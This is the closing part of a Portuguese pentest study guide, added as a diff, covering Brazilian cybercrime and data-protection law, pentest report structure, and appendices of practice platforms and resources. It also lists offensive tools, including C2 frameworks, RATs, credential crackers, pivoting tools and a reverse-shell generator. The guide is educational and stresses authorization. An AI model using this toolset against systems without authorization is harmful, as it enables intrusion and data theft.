+
+**Causas de aumento de pena** (Art. 154-A, §§):
+- Se o crime resultar em obtenção de conteúdo de comunicações eletrônicas, segredos comerciais/industriais, informações sigilosas: pena dobrada.
+- Se cometido contra Presidente da República, governadores, senadores, deputados, prefeitos etc.: pena dobrada.
+- Se houver divulgação, comercialização ou transmissão a terceiros dos dados obtidos: pena aumentada.
+
+**Art. 154-B** — Ação penal pública condicionada à representação (salvo se a vítima for a administração pública).
+
+Outros crimes relacionados inseridos ou agravados pela lei: interrupção de serviço telegráfico, telefônico ou informático (Art. 266); difusão de código malicioso; falsificação de documento ou cartão.
+
+**Implicação prática para pentesters**: a autorização formal e explícita do titular do sistema é elemento que diferencia uma atividade legítima de pentest do crime previsto no Art. 154-A.
+
+## 13.3 Marco Civil da Internet — Lei 12.965/2014
+
+Estabelece princípios, garantias, direitos e deveres para o uso da internet no Brasil.
+
+**Princípios fundamentais (Art. 3º):**
+- Garantia da liberdade de expressão.
+- Proteção da privacidade.
+- Proteção dos dados pessoais.
+- **Preservação e garantia da neutralidade de rede** (sem discriminação de tráfego por conteúdo, origem ou destino).
+- Preservação da estabilidade, segurança e funcionalidade da rede.
+- Responsabilização dos agentes conforme suas atividades.
+- Preservação da natureza participativa da rede.
+- Liberdade dos modelos de negócio (sem restrições à criatividade, livre iniciativa, livre concorrência, defesa do consumidor).
+
+**Direitos do usuário (Art. 7º, destaques):**
+- Inviolabilidade e sigilo do fluxo de comunicações na internet (exceto por ordem judicial).
+- Não suspensão da conexão, exceto por débito diretamente decorrente do uso.
+- Manutenção da qualidade da conexão contratada.
+- Informações claras sobre cláusulas de contratos.
+- Não fornecimento de dados pessoais a terceiros sem consentimento.
+- Publicidade e clareza das políticas de privacidade.
+
+**Relevância para segurança**: o Marco Civil regula a guarda de registros de conexão (provedores devem guardar pelo menos 1 ano) e registros de acesso a aplicações (6 meses), com acesso apenas mediante ordem judicial — fundamental para entender a cadeia de evidências em investigações digitais.
+
+## 13.4 LGPD — Lei Geral de Proteção de Dados (Lei 13.709/2018)
+
+A LGPD regula o tratamento de dados pessoais por pessoas físicas e jurídicas (públicas ou privadas).
+
+**Dados pessoais vs dados sensíveis:**
+- **Dado pessoal**: qualquer informação que identifique ou torne identificável uma pessoa natural (nome, CPF, e-mail, IP, cookies).
+- **Dado sensível**: subconjunto com proteção reforçada — origem racial ou étnica, convicção religiosa, saúde, vida sexual, dado genético ou biométrico.
+
+**Princípios (Art. 6º):**
+Finalidade (propósitos legítimos e explícitos), adequação (compatível com a finalidade), necessidade (mínimo necessário), livre acesso, qualidade dos dados, transparência, segurança, prevenção, não discriminação, responsabilização.
+
+**Bases legais para tratamento (Art. 7º):**
+Consentimento, cumprimento de obrigação legal, execução de políticas públicas, estudos de pesquisa, execução de contrato, exercício regular de direitos, proteção da vida, tutela da saúde, interesse legítimo, proteção do crédito.
+
+**Agentes de tratamento:**
+- **Controlador**: quem decide sobre o tratamento.
+- **Operador**: quem processa em nome do controlador.
+- **Encarregado (DPO)**: canal entre controlador, titulares e ANPD.
+
+**ANPD** (Autoridade Nacional de Proteção de Dados): órgão regulador e fiscalizador.
+
+**Implicação para segurança**: a LGPD impõe obrigação de notificar violações de dados à ANPD e aos titulares em prazo razoável.
+
+> ⚠️ **ATENÇÃO — RESPONSABILIDADE LEGAL E ÉTICA**
+> Pentesters que, durante um teste, acessam dados pessoais de terceiros têm **responsabilidades éticas e legais sobre esse acesso**. O simples fato de estar realizando um teste autorizado não isenta o profissional de responder pelo tratamento indevido de dados pessoais encontrados.
+
+## 13.5 Aspectos Jurídicos da Segurança da Informação
+
+- **Provas digitais**: para ter validade jurídica, a evidência digital precisa ser obtida com rigor (cadeia de custódia, hash, isolamento da cópia forense do original).
+- **Monitoramento no ambiente de trabalho**: empregadores podem monitorar o uso de recursos corporativos (e-mail, internet) desde que haja política clara prévia comunicada aos funcionários — a ausência de política pode inviabilizar o uso dessa evidência em processos.
+
+## 13.6 IA e Legislação — AI Act (UE) e PL 2338/2023 (Brasil)
+
+**AI Act (União Europeia)**: primeira regulação abrangente de IA do mundo, classifica sistemas de IA por nível de risco (inaceitável, alto, limitado, mínimo) com requisitos proporcionais. Sistemas de IA para infraestrutura crítica, aplicação de lei, biometria de identificação remota — tratados como "alto risco".
+
+**PL 2338/2023 (Brasil)**: projeto de lei em tramitação para regulação de IA no Brasil, inspirado no AI Act europeu mas adaptado ao contexto brasileiro — princípios de explicabilidade, não-discriminação, responsabilidade por danos causados por sistemas de IA.
+
+**Implicação para segurança**: ferramentas de segurança que usam IA (detecção de intrusão, análise de comportamento, reconhecimento biométrico) serão reguladas, com requisitos de transparência sobre como as decisões são tomadas.
+
+
+---
+
+# Relatório e Comunicação
+
+*A entrega que transforma o trabalho técnico em valor para o cliente.*
+
+## 14.1 Estrutura do Relatório de Pentest (PTES)
+
+O relatório é o principal entregável de um pentest — é através dele que o cliente compreende as vulnerabilidades encontradas, seu impacto e como corrigi-las. Um bom relatório deve ser escrito de forma clara, separando o nível executivo do técnico.
+
+### Sumário Executivo
+Escrito para a liderança sênior (C-level, conselho), sem jargão técnico. Deve conter:
+
+1. **Background**: contexto do teste — quem solicitou, por quê, o que foi testado, período.
+2. **Postura geral de segurança**: avaliação objetiva da maturidade de segurança do cliente em linguagem de negócio.
+3. **Classificação de risco**: distribuição das vulnerabilidades encontradas por severidade (ex.: 2 críticas, 5 altas, 8 médias, 12 baixas). Frameworks de quantificação: **FAIR** (Factor Analysis of Information Risk) e **DREAD** (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).
+4. **Constatações**: resumo narrativo das descobertas mais impactantes, com o impacto em termos de negócio.
+5. **Recomendações**: ações corretivas prioritárias.
+6. **Cronograma de remediação**: sugestão de prazo e sequência para correções.
+
+### Relatório Técnico
+Escrito para a equipe técnica (desenvolvedores, sysadmins, SOC). Deve detalhar:
+
+1. **Coleta de informação**: metodologia de reconhecimento usada (passive/active), dados coletados.
+2. **Avaliação de vulnerabilidades**: lista detalhada de cada vulnerabilidade — descrição, CVSS, sistemas afetados, evidências (screenshots, logs), referências (CVE, CWE, OWASP).
+3. **Exploração**: demonstração de que a vulnerabilidade é explorável, com prova de conceito (PoC) e impacto real atingido.
+4. **Pós-exploração**: o que foi possível fazer após o acesso inicial (movimento lateral, escalação de privilégio, dados acessados).
+5. **Risco e exposição**: cruzamento de severidade técnica com criticidade do ativo para o negócio.
+6. **Conclusão e recomendações técnicas**: passos específicos de remediação para cada achado, incluindo patches, configurações corretas e arquitetura.
+
+## 14.2 Dicas de Escrita de Relatório
+
+- **Nunca use jargão sem explicação** no sumário executivo.
+- **Evidências concretas**: screenshots, logs, hashes, timestamps — não apenas "foi possível explorar".
+- **Reprodutibilidade**: descreva o passo a passo de forma que a equipe técnica consiga reproduzir (e portanto verificar a correção).
+- **Impacto em negócio**: toda vulnerabilidade técnica deve ser traduzida em impacto de negócio (vazamento de dados de clientes, possibilidade de ransomware, perda financeira, danos de reputação).
+- **Não esconda vulnerabilidades**: o relatório deve ser honesto, mesmo que o resultado seja pior que o esperado pelo cliente.
+
+> 🔒 **SEGURANÇA DO DOCUMENTO — OBRIGATÓRIO**
+> Relatórios de pentest são documentos **altamente sensíveis**: contêm vulnerabilidades não corrigidas, credenciais e vetores de ataque reais.
+>
+> **Criptografe o arquivo, transmita via canal seguro e controle rigorosamente a distribuição.** Um relatório vazado pode ser mais perigoso do que o próprio ataque.
+
+---
+
+# Gestão e Cultura
+
+*Veja Parte 2 (seções 2.6 e 2.7) para Purple Team e Liderança. Esta seção complementa com referências diretas.*
+
+O espírito de Purple Team — colaboração contínua entre Red Team (ofensivo) e Blue Team (defensivo) — é a resposta mais madura à assimetria entre atacar e defender. Ferramentas como **[VECTR](https://vectr.io)** suportam essa colaboração, rastreando exercícios de emulação de adversário e mapeando detecções versus técnicas usadas.
+
+**Emulação de adversário** (uso de TTPs de grupos reais, como APTs, mapeados no framework MITRE ATT&CK) é a evolução natural do red teaming tradicional — a diferença entre "estou testando se vocês me detectam" e "estou simulando como o grupo APT29 agiria no seu ambiente".
+
+---
+
+# Apêndice
+
+## A.1 Plataformas de Prática
+
+| Plataforma | URL | Tipo |
+|---|---|---|
+| [Hack The Box](https://www.hackthebox.com) | hackthebox.com | Máquinas realistas, progressão de nível |
+| [TryHackMe](https://tryhackme.com) | tryhackme.com | Módulos guiados, ótimo para iniciantes |
+| [VulnHub](https://www.vulnhub.com) | vulnhub.com | VMs offline para download |
+| [HackaFlag](https://hackaflag.com.br/ctf.html) | hackaflag.com.br/ctf.html | Plataforma brasileira de CTF |
+| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop) | owasp.org/www-project-juice-shop | App web intencionalmente vulnerável |
+| [OverTheWire](https://overthewire.org) | overthewire.org | Wargames de Linux/segurança |
+| [PortSwigger Web Academy](https://portswigger.net/web-security) | portswigger.net/web-security | Labs de aplicação web (Burp) |
+| [Root-Me](https://www.root-me.org) | root-me.org | Desafios variados, comunidade ativa |
+| [PentesterLab](https://pentesterlab.com) | pentesterlab.com | Foco em web e código |
+
+## A.2 Recursos Online Essenciais
+
+| Recurso | URL |
+|---|---|
+| [OWASP Top 10](https://owasp.org/www-project-top-ten) | owasp.org/www-project-top-ten |
+| [CVE Database](https://www.cve.org) | cve.org |
+| [NVD](https://nvd.nist.gov) | nvd.nist.gov |
+| [ExploitDB](https://www.exploit-db.com) | exploit-db.com |
+| [HackTricks (wiki de pentest)](https://book.hacktricks.wiki) | book.hacktricks.wiki |
+| [GTFOBins (binários Unix para escalação)](https://gtfobins.github.io) | gtfobins.github.io |
+| [LOLBAS (binários Windows para escalação)](https://lolbas-project.github.io) | lolbas-project.github.io |
+| [PayloadsAllTheThings (cheat sheets)](https://github.com/swisskyrepo/PayloadsAllTheThings) | github.com/swisskyrepo/PayloadsAllTheThings |
+| [MITRE ATT&CK](https://attack.mitre.org) | attack.mitre.org |
+| [Rapid7 Vulnerability DB](https://www.rapid7.com/db) | rapid7.com/db |
+| [RevShells (gerador de reverse shells)](https://www.revshells.com) | revshells.com |
+| [CrackStation (quebra de hash)](https://crackstation.net) | crackstation.net |
+| [Hashes.com](https://hashes.com) | hashes.com |
+| [CyberChef](https://gchq.github.io/CyberChef) | gchq.github.io/CyberChef |
+| [Pentest Monkey Cheat Sheets](https://pentestmonkey.net) | pentestmonkey.net |
+| [VirusTotal](https://www.virustotal.com) | virustotal.com |
+| [Shodan](https://www.shodan.io) | shodan.io |
+
+## A.3 Catálogo Agrupado de Ferramentas
+
+### Reconhecimento e OSINT
+- [NMAP](https://nmap.org)
+- [TheHarvester](https://github.com/laramies/theHarvester)
+- [Recon-ng](https://github.com/lanmaster53/recon-ng)
+- [Maltego](https://www.maltego.com)
+- [Sublist3r](https://github.com/aboul3la/Sublist3r)
+- [Shodan](https://www.shodan.io)
+- [Censys](https://search.censys.io)
+- [WhatWeb](https://github.com/urbanadventurer/WhatWeb)
+- [Wappalyzer](https://www.wappalyzer.com)
+- [crt.sh](https://crt.sh)
+- [Hunter.io](https://hunter.io)
+- [SpiderFoot](https://www.spiderfoot.net)
+
+### Descoberta de Conteúdo
+- [Gobuster](https://github.com/OJ/gobuster)
+- [Dirb](https://sourceforge.net/projects/dirb)
+- [Dirbuster](https://github.com/KajanM/DirBuster)
+- [Feroxbuster](https://github.com/epi052/feroxbuster)
+- [Dirsearch](https://github.com/maurosoria/dirsearch)
+- [FFUF](https://github.com/ffuf/ffuf)
+
+### Enumeração de Serviços
+- [NIKTO](https://github.com/sullo/nikto) (web)
+- [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux)
+- SMBClient
+- [SMBMap](https://github.com/ShawnDEvans/smbmap)
+- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+- RPCCLIENT (SMB/RPC)
+- SNMP-CHECK
+- [Onesuxtyone](https://github.com/trailofbits/onesixtyone) (SNMP)
+- SMTP-USER-ENUM
+
+### Captura e Análise de Tráfego
+- [Wireshark](https://www.wireshark.org)
+- [Tcpdump](https://www.tcpdump.org)
+- [TShark](https://www.wireshark.org/docs/man-pages/tshark.html)
+- [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
+- [Bettercap](https://www.bettercap.org)
+- [Ettercap](https://www.ettercap-project.org)
+- [mitmproxy](https://mitmproxy.org)
+- [Responder](https://github.com/lgandx/Responder)
+
+### Exploração Web
+- [Burp Suite](https://portswigger.net/burp)
+- [SQLMap](https://sqlmap.org)
+- [OWASP ZAP](https://www.zaproxy.org)
+- [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
+
+### Força Bruta / Quebra de Credencial
+- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
+- [Medusa](https://github.com/jmk-foofus/medusa)
+- [John the Ripper](https://www.openwall.com/john)
+- [Hashcat](https://hashcat.net/hashcat)
+- [Ophcrack](https://ophcrack.sourceforge.io)
+
+### Frameworks de Exploração
+- [Metasploit](https://www.metasploit.com) (msfconsole, msfvenom)
+- [Impacket](https://github.com/fortra/impacket) (ferramentas Python para protocolos Windows)
+
+### Pós-exploração e Pivoting
+- Meterpreter (incluso no Metasploit)
+- [pwncat-cs](https://github.com/calebstewart/pwncat)
+- [Chisel](https://github.com/jpillora/chisel)
+- [rsocx](https://github.com/b23r0/rsocx)
+- [proxychains4](https://github.com/haad/proxychains)
+- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
+- [WinPEAS](https://github.com/carlospolop/PEASS-ng)
+- [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
+
+### C2
+- [Metasploit MSFConsole](https://www.metasploit.com)
+- [CobaltStrike](https://www.cobaltstrike.com)
+- [Empire](https://github.com/BC-SECURITY/Empire)
+- [Covenant](https://github.com/cobbr/Covenant)
+- [PoshC2](https://github.com/nettitude/PoshC2)
+- [Octopus C2](https://github.com/mhaskar/Octopus)
+- [PupyRAT](https://github.com/n1nj4sec/pupy)
+
+### Forense e Malware
+- [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager)
+- [Autopsy](https://www.autopsy.com)
+- [Volatility](https://github.com/volatilityfoundation/volatility3)
+- [DumpIT](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows)
+- [PEStudio](https://www.winitor.com)
+- [PEiD](https://github.com/wolfram77web/app-peid)
+- [CAPA](https://github.com/mandiant/capa)
+- [Ghidra](https://ghidra-sre.org)
+- [IDA Pro](https://hex-rays.com/ida-pro)
+- [x64dbg](https://x64dbg.com)
+- [REMnux](https://remnux.org)
+- [FlareVM](https://github.com/mandiant/flare-vm)
+- [FakeNet-NG](https://github.com/mandiant/flare-fakenet-ng)
+- [ExifTool](https://exiftool.org)
+- [CFF Explorer](https://ntcore.com/explorer-suite)
+
+### Utilitários
+- [CyberChef](https://gchq.github.io/CyberChef)
+- [Crunch](https://sourceforge.net/projects/crunch-wordlist) (wordlists)
+- [Bopscrk](https://github.com/r3nt0n/bopscrk)
+- [CeWL](https://github.com/digininja/CeWL)
+- [Netcat](https://nmap.org/ncat) (nc)
+- [FoxyProxy](https://getfoxyproxy.org)
+- [ProtonVPN](https://protonvpn.com)
+
+## A.4 Wordlists Padrão
+
+| Wordlist | Localização padrão (Kali) |
+|---|---|
+| rockyou.txt | /usr/share/wordlists/rockyou.txt |
+| SecLists (diretórios, senhas, fuzzing) | /usr/share/seclists/ |
+| Dirbuster wordlist | /usr/share/dirbuster/wordlists/ |
+
+## A.5 Livros e Referências Bibliográficas
+
+| Título | Autor |
+|---|---|
+| Pentest em Aplicações Web | Daniel Moreno (Novatec, 2017) |
+| The Web Application Hacker's Handbook | Stuttard & Pinto |
+| Hacking: The Art of Exploitation | Jon Erickson |
+| Metasploit: The Penetration Tester's Guide | Kennedy et al. |
+| The Hacker Playbook 3 | Peter Kim |
+| Red Team Development and Operations | Joe Vest |
+
+## A.6 Referências Legais (Brasil)
+
+| Documento | Referência |
+|---|---|
+| Lei 12.737/2012 (Crimes Informáticos) | Art. 154-A, 154-B CP |
+| Lei 12.965/2014 (Marco Civil da Internet) | — |
+| Lei 13.709/2018 (LGPD) | — |
+| ABNT NBR ISO/IEC 27001 | Gestão de SI |
+| ABNT NBR ISO/IEC 27002 | Boas práticas de controles |
+| [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org) | ptes.org |
+| [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide) | owasp.org |
+| [NIST CSF](https://www.nist.gov/cyberframework) | nist.gov/cyberframework |
+
+---
+
+*Fim do documento. Versão compilada a partir de ~160 fontes. Para uso exclusivamente educacional — nunca aplique as técnicas aqui descritas em sistemas sem autorização formal e documentada do titular.*
+
